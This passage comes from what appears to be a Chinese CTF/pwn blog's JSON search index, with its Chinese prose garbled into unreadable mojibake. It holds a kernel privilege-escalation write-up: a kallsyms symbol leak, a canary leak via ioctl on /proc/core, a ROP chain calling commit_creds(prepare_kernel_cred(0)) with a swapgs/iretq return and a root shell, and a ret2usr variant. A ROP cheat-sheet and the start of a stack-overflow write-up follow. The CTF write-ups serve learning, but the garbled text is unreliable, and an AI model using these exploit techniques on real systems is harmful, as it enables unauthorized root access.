è½½åŸºåœ°å€vmlinux_baseå’Œprepare_kernel_credå‡½æ•°ã€commit_credså‡½æ•°åœ°å€\nsize_t find_symbols()\n{\n    FILE* kallsyms_fd = fopen(\"/tmp/kallsyms\", \"r\");\n    if(kallsyms_fd < 0)\n    {\n        puts(\"[*]open kallsyms error!\");\n        exit(0);\n    }\n\n    char buf[0x30] = {0};\n    while(fgets(buf, 0x30, kallsyms_fd))\n    {\n        if(commit_creds & prepare_kernel_cred)\n            return 0;\n\n        if(strstr(buf, \"commit_creds\") && !commit_creds)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            /* printf(\"hex: %s\\n\", hex); */\n            sscanf(hex, \"%llx\", &commit_creds);\n            printf(\"commit_creds addr: %p\\n\", commit_creds);\n            vmlinux_base = commit_creds - 0x9c8e0;\n            printf(\"vmlinux_base addr: %p\\n\", vmlinux_base);\n            \n        }\n\n        if(strstr(buf, \"prepare_kernel_cred\") && !prepare_kernel_cred)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            sscanf(hex, \"%llx\", &prepare_kernel_cred);\n            printf(\"prepare_kernel_cred addr: %p\\n\", prepare_kernel_cred);\n            vmlinux_base = prepare_kernel_cred - 0x9cce0;\n            /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */\n        }\n    }\n\n    if(!(prepare_kernel_cred & commit_creds))\n    {\n        puts(\"[*]Error!\");\n        exit(0);\n    }\n}\n```\n\nè¿™é‡Œçš„0x9c8e0å’Œ0x9cce0éƒ½æ˜¯é€šè¿‡ROPgadgetæŸ¥æ‰¾vmlinuxæ‰¾å‡ºæ¥çš„ï¼Œä¸è¿‡æ‰¾åˆ°çš„åœ°å€æ˜¯ç›¸å¯¹åç§»åŠ ä¸Šäº†0xffffffff81000000ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‡å»å¾—åˆ°ç›¸å¯¹åç§»ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508584.jpeg)\n\n(2)ç„¶åæ³„éœ²canary:\n\n```\n//æ³¨é‡Šå¤´\n\nvoid core_read(int fd, char *buf)\n{\n    puts(\"[*]read to buf.\");\n    ioctl(fd, 0x6677889B, buf);\n}\n----------------------------------------------------------------------\nvoid set_off(int fd, long long idx)\n{\n    printf(\"[*]set off to %ld\\n\", idx);\n    ioctl(fd, 0x6677889C, idx);\n}\n---------------------------------------------------------------------\nset_off(fd, 0x40);\n\nchar buf[0x40] = {0};\ncore_read(fd, buf);\nsize_t canary = ((size_t *)buf)[0];\nprintf(\"[+]canary: %p\\n\", canary);\n//è¿™é‡Œfdä¸ºint fd = open(\"/proc/core\", 2);\n```\n\n(3)æ„é€ ropé“¾ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nssize_t offset = vmlinux_base - 0xffffffff81000000;\nsize_t rop[0x1000] = {0};\nfor(int i = 0; i < 10; i++)\n{\n    rop[i] = canary;\n}\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss;\n```\n\nè¿™é‡Œropé“¾æ„é€ ä¸€èˆ¬åˆ†ä¸º\n\nâ‘ è¦†ç›–è¿”å›åœ°å€ï¼Œæ‰§è¡Œcommit_creds(prepare_kernel_cred(0) )å‡½æ•°ï¼Œææƒï¼Œå³ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\nâ‘¡é€šè¿‡swapgså’Œiretqè¿”å›ç”¨æˆ·æ€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n```\n\nâ–²è¿™é‡Œçš„swapgså’Œiretqæœ€å¥½ç”¨objdump -d vmlinux > gadgetæ¥ä¿å­˜å¯»æ‰¾ï¼Œå¦‚æœç”¨ROPgadgetæˆ–è€…ropperå¯èƒ½ä¸è¯†åˆ«ï¼Œä»è€Œæ— æ³•æ‰¾åˆ°ã€‚\n\nâ‘¢ç€é™†å¼€shellï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n\nvoid spawn_shell()\n{\n    if(!getuid())\n    {\n\tsystem(\"/bin/sh\");\n    }\n    else\n    {\n\tputs(\"[*]spawn shell error!\");\n    }\n    exit(0);\n}\n----------------------------------------------------\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss; // ss\n```\n\n(4)æœ€åè¾“å…¥ropé“¾ï¼Œææƒæ‰§è¡Œï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nvoid core_copy_func(int fd, long long size)\n{\n    printf(\"[*]copy from user with size: %ld\\n\", size);\n    ioctl(fd, 0x6677889A, size);\n}\n--------------------------------------------------------------\nwrite(fd, rop, 0x800);\ncore_copy_func(fd, 0xffffffffffff0000 | (0x100));\n```\n\nâ–²éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ç¨‹åºè¿›å…¥å†…æ ¸æ€ä¹‹å‰éœ€è¦ä¿å­˜ä¸‹ç”¨æˆ·æ€çš„å‚æ•°ï¼Œä¸ç„¶ä¹‹åæ²¡åŠæ³•è¿”å›ç”¨æˆ·æ€å¼€shellï¼š\n\n```\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        );\n    puts(\"[*]status has been saved.\");\n}\n```\n\n \n\näºŒã€ä½¿ç”¨Ret2usræŠ€æœ¯ï¼š\n\n1.åœ¨è¿™é“é¢˜ä¸­ä¸ROPå·®ä¸å¤šï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºææƒçš„æ—¶å€™ï¼š\n\n(1)ROPæŠ€æœ¯ä¸­ï¼Œåˆ©ç”¨æ€æƒ³å’Œå¸¸è§„pwné¢˜ä¸€æ ·ï¼Œrdiä¼ å‚ä¹‹åå¯»æ‰¾Gadgetæ¥è°ƒç”¨commit_creds(prepare_kernel_cred(0))ã€‚\n\n(2)Ret2UsræŠ€æœ¯ä¸­ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç›´æ¥è¿è¡Œæˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶expï¼Œæ‰€ä»¥åœ¨expæ–‡ä»¶å†…å£°æ˜å®šä¹‰çš„å‡½æ•°ä¼šè¢«åŠ è½½åˆ°expçš„è¿›ç¨‹ä¸­ï¼Œå¯ä»¥ç›´æ¥åœ¨expä¸­è°ƒç”¨ï¼Œä¸éœ€è¦ropã€‚ä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥è°ƒç”¨system(\"/bin/sh\")æ²¡ä»€ä¹ˆç”¨ï¼Œæƒé™ä»ç„¶ä¸æ˜¯rootï¼Œè¿˜æ˜¯éœ€è¦è°ƒç”¨commit_creds(prepare_kernel_cred(0))ææƒæ‰è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ³„éœ²å‡ºæ¥çš„åœ°å€ç›´æ¥æ„é€ è¯¥å‡½æ•°è°ƒç”¨å³å¯ï¼Œè€Œä¸ç”¨å†ropæ¥è°ƒç”¨äº†ã€‚\n\nå°±ç›¸å½“äºå°†ä»¥ä¸‹ä»£ç æ›¿æ¢ä¸€ä¸‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\næ›¿æ¢æˆï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = (size_t)get_root;\n------------------------------------------------\n//å‡½æ•°å®šä¹‰ä¸ºï¼š\nvoid get_root()\n{\n    char* (*pkc)(int) = prepare_kernel_cred;\n    void (*cc)(char*) = commit_creds;\n    (*cc)((*pkc)(0));\n    /* puts(\"[*] root now.\"); */\n}\n```\n\næœ€å¼€å§‹æˆ‘æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥è¿è¡Œè°ƒç”¨ï¼Œåé¢æ‰çŸ¥é“æ˜¯ç‰¹æƒæ¨¡å¼é—®é¢˜ã€‚å¦‚æœç›´æ¥è°ƒç”¨ï¼Œå°±ä¼šå‡ºç°è®¿é—®é”™è¯¯ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„å‡½æ•°çš„å‡½æ•°åœ°å€æ˜¯åœ¨å†…æ ¸ç©ºé—´ä¸­ï¼Œè€Œç”¨æˆ·ç©ºé—´æ˜¯æ— æ³•è¿è¡Œå†…æ ¸ç©ºé—´çš„å‡½æ•°ã€‚æ‰€ä»¥éœ€è¦è°ƒç”¨write(fd, rop, 0x30 * 8);è¿›å…¥åˆ°å†…æ ¸ç©ºé—´ï¼Œè·å¾—ç‰¹æƒæ¨¡å¼ä¸‹ring0çš„æƒé™ï¼Œç„¶åè¿è¡Œç”¨æˆ·ç©ºé—´çš„get_root()å‡½æ•°ï¼Œå†è¿›å…¥åˆ°å†…æ ¸ç©ºé—´å¯»æ‰¾å¯¹äºçš„commit_credså‡½æ•°å’Œprepare_kernel_cred(0)ç»“æ„ä½“ï¼Œä»è€Œææƒã€‚\n\n \n\n \n\n \n\n \n\nå‚è€ƒèµ„æ–™:\n\nctfwiki\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernelé¢˜"],"categories":["pwn-kernel","Kernel-ROP","Kernel-Ret2Usr"]},{"title":"ROPæ±‡æ€»","url":"/2021/08/14/ROPæ±‡æ€»/","content":"\nä¸€ã€32ä½ROPï¼š\n\n1.å¦‚æœæ˜¯ç›´æ¥è·³è½¬pltè¡¨ä¸­çš„åœ°å€ï¼Œé‚£ä¹ˆæ ˆçš„å¸ƒç½®é¡ºåºåº”è¯¥æ˜¯ï¼š\n\nsystemå‡½æ•°-systemå‡½æ•°çš„è¿”å›åœ°å€-sytemå‡½æ•°çš„å‚æ•°ã€‚\n\n2.ä½†å¦‚æœæ˜¯è·³è½¬call systemï¼Œé‚£ä¹ˆç”±äºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨pushè¿›eipï¼Œåˆ™æ ˆå¸ƒç½®åº”è¯¥ä¸ºï¼š\n\ncall systemå‡½æ•°åœ°å€-systemå‡½æ•°å‚æ•°ã€‚\n\n(ä¸¤è€…ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦åŠ ä»¥åŒºåˆ†ã€‚åé¢ä¼šæœ‰gotè¡¨å’Œpltçš„è¯¦ç»†è®²è§£)\n\n \n\näºŒã€64ä½ROPï¼š\n\néœ€è¦ä¼ å‚æŒ‡ä»¤ï¼špop rdi;retã€‚è¿™é‡Œå°±ä¸ç”¨ç®¡æ˜¯pltè¿˜æ˜¯calläº†ï¼Œå› ä¸ºä¼ å‚æ˜¯rdiä¼ å‚ï¼Œè¿”å›åœ°å€æ˜¯å•¥éƒ½æ²¡å…³ç³»ï¼Œå¤šå‚æ•°çš„éœ€è¦ä¸‡èƒ½gadgetã€‚\n\nâ–²64ä½ç¨‹åºä¸­å‡½æ•°å–å‚æ•°æ˜¯å–rdiä¸­å†…å®¹æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ï¼Œç›¸å½“äº*rdiï¼ŒåŒæ ·çš„32ä½ç¨‹åºä¸­å–å‚æ˜¯å–æ ˆä¸Šçš„å†…å®¹æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ï¼Œç›¸å½“äº*[ebp+var_0xh]ï¼Œæ‰€ä»¥ç›´æ¥è¾“å…¥binshå­—ç¬¦ä¸²æ¥èµ‹å€¼ç»™rdiæˆ–è€…èµ‹å€¼ç»™å‡½æ•°å‚æ•°è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€ï¼Œè€Œæ˜¯å­—ç¬¦ä¸²çš„äºŒè¿›åˆ¶å½¢å¼ã€‚\n\n \n\nä¸‰ã€ä¸‡èƒ½gadget\n\n1.ä¼ å…¥gotè¡¨å’Œpltè¡¨çš„åŒºåˆ«ï¼š\n\nä¸‡èƒ½gadgetä¸­è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°ä¸ºcall qword ptr[r12+rbx*8]ï¼Œç¡¬ç¼–ç ä¸ºFFï¼Œæ˜¯å–r12ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€aï¼Œè¿™ä¸ªåœ°å€aä¿å­˜çš„å†…å®¹åº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€bï¼Œè¯¥åœ°å€bæŒ‡å‘çš„åœ°æ–¹æ‰æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„å®é™…ä»£ç ä½ç½®ã€‚\n\nä¾‹å¦‚:\n\n```\n#æ³¨é‡Šå¤´\n\nr12:    got_a\ngot_a:  0x111\n0x111:  mov a b\n```\n\næ‰€ä»¥call qword ptr[r12+rbx*8]å®é™…æ‰§è¡Œè·³è½¬åˆ°çš„ä½ç½®æ˜¯0x111ï¼Œè€Œæ‰§è¡Œçš„ä»£ç æ˜¯mov a b;åªèƒ½ä¼ å…¥gotè¡¨ï¼Œå¦‚æœä¼ å…¥pltè¡¨ï¼Œé‚£ä¹ˆåº”è¯¥å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nr12:          plt_a\nplt_a:        jmp got_a\njmp got_a:    æ— æ•ˆç¼–ç åœ°å€\n#è¿™ä¸ªjmp got_aè½¬æ¢æˆç¡¬ç¼–ç å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€\n```\n\n2.ä¸åŒçš„callåŒºåˆ«ï¼š\n\nFFçš„callåé¢è·Ÿçš„æ˜¯åœ°å€çš„åœ°å€ã€‚ä¾‹å¦‚call [func], è·³è½¬çš„åœ°æ–¹å°±åº”è¯¥æ˜¯funcè¿™ä¸ªåœ°å€é‡Œä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯*funcã€‚\n\nE8çš„callåé¢è·Ÿçš„æ˜¯åœ°å€ã€‚ä¾‹å¦‚call funcï¼Œè·³è½¬çš„åœ°æ–¹å°±æ˜¯funcçš„å¼€å¤´ã€‚\n\nâ–²æ™®é€šcallï¼ŒEBç¼–ç ï¼šcall fun_c(æœ€å¸¸ç”¨çš„)\n\nfun_cï¼š mov a b\n\nç›¸å½“äºç›´æ¥è·³è½¬åˆ°fun_cè¿™ä¸ªåœ°å€æ¥æ‰§è¡Œä»£ç \n\n \n\n \n\nå››ã€mainå‡½æ•°è¿”å›çš„ROPï¼š\n\n1.æœ€å¼€å§‹å¯åŠ¨ç¨‹åºæ—¶ï¼Œmainå‡½æ•°æ ˆä¸æ˜¯æ±‡ç¼–ä»£ç å†™çš„é‚£ä¹ˆå¤§ï¼Œè€Œåº”è¯¥å†å¤§ä¸¤ä¸ª0x04ç”¨æ¥å­˜æ”¾å…¨å±€åç§»ï¼Œæ‰€ä»¥è®¡ç®—åç§»æ—¶å°±éœ€è¦å†åŠ ä¸Šä¸¤ä¸ª0x04\n\n2.é€šè¿‡å†æ¬¡è¿›å…¥mainå‡½æ•°ä¸­ä¹‹åï¼Œç¨‹åºåªä¼šä¾ç…§æ±‡ç¼–ä»£ç æ¥æ„é€ Mainhå‡½æ•°æ ˆï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡é‡Œçš„mainå‡½æ•°æ ˆä¸­å°±æ²¡æœ‰å…¨å±€åç§»çš„ä¸œè¥¿äº†ï¼Œæ­£å¸¸è®¡ç®—åç§»ã€‚\n\n \n\n \n\näº”ã€æŠ€å·§æ€§ï¼š\n\n1.é€šè¿‡è¦†ç›–è¿”å›åœ°å€è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥æ³¨æ„ä¸Šä¸€ä¸ªå‡½æ•°æ ˆä¸­çš„espçš„ä½ç½®ï¼Œç„¶åç›´æ¥é€šè¿‡Popç­‰æ“ä½œç»§ç»­å¾€ä¸‹retnåˆ°è¾“å…¥çš„payloadä¸­çš„å‡½æ•°åœ°å€ã€‚(RedHat 2017-pwn1)\n\n2.ropä¸»è¦æ˜¯æ‰¾systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰çš„è¯å…¶å®ç”¨int80å¯ä»¥ä»£æ›¿systemï¼Œç„¶åsh\\bashä»€ä¹ˆçš„ä¹Ÿå¯ä»¥ä»£æ›¿binshå­—ç¬¦ä¸²ã€‚\n\n3.ä½¿ç”¨int80çš„è¯éœ€è¦è®¾ç½®å¯„å­˜å™¨ï¼ŒåŒæ ·å¦‚æœæœ‰å…¶å®ƒå¯ä»¥ç”¨åˆ°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡ï¼š\n\nhttp://syscalls.kernelgrok.com/ è¿™ä¸ªæ¥æŸ¥æ‰¾\n\n4.onegadgetéœ€è¦æ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ç›´æ¥æŸ¥ï¼šone_gadget libcæ–‡ä»¶ï¼Œç„¶åé€šè¿‡è°ƒè¯•æˆ–è€…IDAçœ‹æ±‡ç¼–ï¼Œè§‚å¯Ÿåˆ°è¾¾è°ƒç”¨onegadgetçš„æ—¶å€™æ¡ä»¶æ»¡ä¸æ»¡è¶³ã€‚\n\n5.æŸ¥æ‰¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\none_gadget libc_so.6\nROPgadget --binary file | grep \"pop eax ; pop ebx ; pop esi ; pop edi ; ret\"\n```\n\n \n\n \n\n \n\n \n\næ€»ç»“ï¼š\n\næ‰€ä»¥ä¸‡èƒ½gadgetä¸­é€šè¿‡r12ï¼Œä¼ å…¥è·³è½¬å‡½æ•°çš„åœ°å€åªèƒ½æ˜¯å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹åçš„gotè¡¨åœ°å€ï¼Œè€Œä¸èƒ½æ˜¯pltè¡¨åœ°å€æˆ–è€…æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„gotè¡¨åœ°å€ï¼Œ(å»¶è¿Ÿç»‘å®šåªèƒ½é€šè¿‡pltè¡¨æ¥æ“ä½œï¼Œæ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰ï¼Œè¯¥gotè¡¨ä¸­çš„å†…å®¹æ˜¯ç­‰åŒäºæ— æ•ˆçš„ï¼Œåªæ˜¯ä¸€ä¸ªexternæ®µçš„åç§»åœ°å€ï¼Œé™¤éè¯¥å‡½æ•°funcæ˜¯é™æ€ç¼–è¯‘è¿›ç¨‹åºé‡Œé¢çš„ï¼Œé‚£ä¹ˆgotè¡¨ä¸­çš„å†…å®¹å°±æ˜¯è¯¥å‡½æ•°çš„çœŸå®æœ‰æ•ˆåœ°å€ï¼Œä¸ä¼šå‘ç”Ÿå»¶è¿Ÿç»‘å®šã€‚)å› ä¸ºpltè¡¨ä¸­çš„å†…å®¹è½¬æ¢æˆç¡¬ç¼–ç å‹æ ¹å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œæ›´åˆ«è¯´è·³è½¬åˆ°è¯¥åœ°å€ä¿å­˜çš„å†…å®¹çš„åœ°æ–¹äº†ã€‚æœ‰äººè¯´è·³è½¬åˆ°pltè¡¨æ‰§è¡Œçš„å°±æ˜¯è·³è½¬gotè¡¨ï¼Œé‚£åº”è¯¥æ˜¯ä¸€æ ·çš„å•Šï¼Œä½†FFçš„callå¹¶ä¸æ˜¯è·³è½¬åˆ°pltæ¥æ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œè€Œæ˜¯å–pltè¡¨ä¸­å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†è·³è½¬åˆ°è¯¥åœ°å€æ¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥æœ‰æ—¶å€™éœ€è¦çœ‹æ±‡ç¼–ä»£ç æ¥å†³å®šç©¶ç«Ÿæ˜¯ä¼ å…¥gotè¡¨è¿˜æ˜¯ä¼ å…¥pltè¡¨ã€‚åŒæ ·ä¹Ÿå¯ä»¥çœ‹åˆ°pltè¡¨ä¸­çš„ç¡¬ç¼–ç æ˜¯FFï¼Œä¹Ÿå°±æ˜¯å¹¶ä¸æ˜¯è·³è½¬gotè¡¨ï¼Œè€Œæ˜¯å–gotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†æ¥è·³è½¬ã€‚\n\néœ€è¦è·³è½¬å‡½æ•°æ—¶ï¼Œæœ‰[]çš„-åªèƒ½ä¼ gotè¡¨ï¼Œæ²¡[]çš„-ä¼ pltè¡¨(pltè¡¨æ›´å®‰å…¨å¥½ä½¿ï¼Œä½†åé¢æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒgotè¡¨åˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œæƒ…å†µæ¯”è¾ƒå¤æ‚)ã€‚\n\néœ€è¦æ‰“å°çœŸå®å‡½æ•°åœ°å€æ—¶ï¼Œä¼ çš„ä¸€å®šæ˜¯gotè¡¨ï¼Œè¿™æ ·å°±ä¸€å®šæ²¡é”™ã€‚\n\nå½“æœ‰call eax;è¿™ç±»è¯­å¥æ—¶ï¼Œeaxä¸­ä¿å­˜çš„ä¸€å®šå¾—æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œå› ä¸ºè¿™é‡Œçš„callç¡¬ç¼–ç ä¹Ÿæ˜¯0FFã€‚\n\n \n\n1.å¾€putså‡½æ•°ä¸­ä¼ å…¥å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼ˆelf.gotï¼‰å‚æ•°å¯ä»¥æ‰“å°å‡ºè¢«åŠ è½½åœ¨Libcä¸­çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n2.ç”¨è¦†ç›–è¿”å›åœ°å€retçš„å½¢å¼è°ƒç”¨å‡½æ•°éœ€è¦ç”¨å‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ï¼Œï¼ˆelf.pltï¼‰è¿™æ˜¯åº“å‡½æ•°åœ°å€ï¼Œéœ€è¦å…ˆåˆ°pltä¸­ï¼Œç„¶åå†åˆ°gotè¡¨ä¸­ï¼Œè¿™æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ã€‚\n\n3.ä½†å¦‚æœåœ¨gadgetä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡ç»™r12èµ‹å€¼æ¥è°ƒç”¨elf.gotè¡¨ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯call qword ptr[r12+rbx*8]ï¼ŒæŒ‡å‘çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çœŸå®åœ°å€ï¼Œéœ€è¦çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚å¦‚æœåªæ˜¯call addrï¼Œåˆ™åº”è¯¥æ˜¯callå‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ã€‚\n\n4.ä¸‡èƒ½gadgetä¸€èˆ¬åœ¨_libc_csu_initä¸­ï¼Œæˆ–è€…initæˆ–è€…ç›´æ¥ROPgadgetæŸ¥ä¹Ÿå¯ä»¥\n","tags":["Fmstr"],"categories":["PWN","ROP0x3"]},{"title":"RedHat 2017-pwn1","url":"/2021/08/14/RedHat 2017-pwn1/","content":"\n \n\n1.å¸¸è§„ checksecæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°å¼€å¯äº†NXï¼ŒIDAæ‰“å¼€ç¨‹åºæ‰¾æ¼æ´ï¼Œå˜é‡V1çš„é¦–åœ°å€ä¸ºbp-28hï¼Œå³å˜é‡åœ¨æ ˆä¸Šã€‚è€Œä¹‹åè¿˜æœ‰__isoc99_scanfä¸é™åˆ¶é•¿åº¦çš„å‡½æ•°ï¼Œæ‰€ä»¥è¾“å…¥ä¼šå¯¼è‡´æ ˆæº¢å‡ºã€‚è¿™æ ·å°±å¯ä»¥å¯»æ‰¾systemå’Œâ€bin/shâ€æ¥getshelläº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nint v1; // [esp+18h] [ebp-28h]\n----------------------------------------------------------\n__isoc99_scanf(\"%s\", &v1);\n```\n\n2.é¦–å…ˆctrl+sçœ‹çœ‹.got.pltä¸­æœ‰æ²¡æœ‰systemå‡½æ•°ï¼Œè¿™é‡Œæœ‰ã€‚æ‰¾åˆ°systemå‡½æ•°åï¼Œå†å¯»æ‰¾â€/bin/shâ€ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥è€ƒè™‘ä»__isoc99_scanfæ¥è¯»å–â€/bin/shâ€æ¥å†™å…¥åˆ°å†…å­˜è¿›ç¨‹ä¸­ã€‚\n\n3.æ¥ä¸‹æ¥è€ƒè™‘å­—ç¬¦ä¸²â€/bin/shâ€åº”è¯¥æ”¾åˆ°å“ªé‡Œï¼Œå› ä¸ºå¯èƒ½ä¼šæœ‰ASLR(åœ°å€éšæœºåŒ–)çš„å½±å“ï¼Œæ‰€ä»¥æœ€å¥½æ‰¾ä¸ªå¯ä»¥å›ºå®šçš„å†…å­˜åœ°å€æ¥å­˜æ”¾æ•°æ®ã€‚ctrl+sæŸ¥çœ‹å†…å­˜é¡µåå¯ä»¥çœ‹åˆ°æœ‰ä¸ª0x0804a030å¼€å§‹çš„å¯è¯»å¯å†™çš„å¤§äº8å­—èŠ‚çš„åœ°å€ï¼Œä¸”è¯¥åœ°å€ä¸å—ASLRå½±å“ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘æŠŠå­—ç¬¦ä¸²è¯»åˆ°è¿™é‡Œã€‚(å¯ä»¥çœ‹åˆ°æœ‰Rå’ŒWæƒé™ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçœ‹è¯¥åœ°å€å—ä¸å—åˆ°ASLRçš„å½±å“ï¼Œå¯ä»¥æŒ‰ç…§ä»¥å‰çš„åšæ³•ï¼Œè¿™é‡Œå¯ä»¥å°†è¯¥åœ°å€ä¿®æ”¹ä¸ºæŸä¸ªexternæ®µçš„åœ°å€ï¼Œå› ä¸ºå»¶è¿Ÿç»‘å®šä¹‹åï¼Œè¿™ä¸ªæ®µä¸­çš„å†…å®¹å°±åŸºæœ¬æ²¡ç”¨äº†ï¼Œè¿™é‡Œé€‰æ‹©è¿™ä¸ªæ®µä¸Šçš„æŸä¸ªåœ°å€ä¸€æ ·å¯ä»¥getshellï¼Œæˆ‘é€‰çš„æ˜¯0x0804A050ã€‚)\n\n4.æ—¢ç„¶ç¨‹åºè¯»å–ç”¨çš„æ˜¯__isoc99_scanfï¼Œé‚£ä¹ˆå‚æ•°â€%sâ€ä¹Ÿå¾—æ‰¾åˆ°ï¼Œå®¹æ˜“æ‰¾åˆ°ä½äº0x08048629ã€‚\n\n5.å…ˆç¼–å†™ropé“¾æµ‹è¯•ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF('./pwn1')#ropé“¾å¿…å¤‡ï¼Œç”¨äºæ‰“å¼€pltå’Œgotè¡¨æ¥è·å–å‡½æ•°åœ°å€\nscanf_addr = p32(elf.symbols['__isoc99_scanf'])#è·å–scanfçš„åœ°å€\nformat_s = p32(0x08048629)#è¿™æ˜¯æˆ‘ä»¬scanfèµ‹äºˆâ€%sâ€çš„åœ°å€\nbinsh_addr = p32(0x0804a030)#bin/shä¿å­˜çš„åœ°å€\n\nshellcode = â€˜Aâ€™*0x34 + scanf_addr + format_s + binsh_addr\nprint io.read()\n#è¯»å–puts(\"pwn test\")çš„è¾“å‡ºï¼Œä»¥ä¾¿ç»§ç»­æ‰§è¡Œã€‚io.recv()ä¸€æ 